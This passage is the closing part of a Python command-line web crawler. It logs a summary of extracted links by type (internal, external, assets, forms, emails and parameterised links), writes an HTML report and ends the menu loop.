                report  = crawler.generate_matrix_html()

                log_title("Link Extraction Summary")
                log_kv("Total links",    str(len(links)))
                log_kv("Internal",       str(len([l for l in links if l.link_type == "internal"])))
                log_kv("External",       str(len([l for l in links if l.link_type == "external"])))
                log_kv("Assets",         str(len([l for l in links if l.link_type == "asset"])))
                log_kv("Forms",          str(len([l for l in links if l.link_type == "form"])))
                log_kv("Emails found",   str(len(crawler.emails)))
                log_kv("With params",    str(len([l for l in links if l.has_params])))
                log_success(f"Matrix report → {report}")
            except Exception as e:
                log_error(f"Link extraction error: {e}")

        # ── 0: Exit ──────────────────────────────────────────
        elif choice == "0":
            log_success("Exiting…")
            break

        else:
            log_error("Invalid option")


if __name__ == "__main__":
    main_menu()
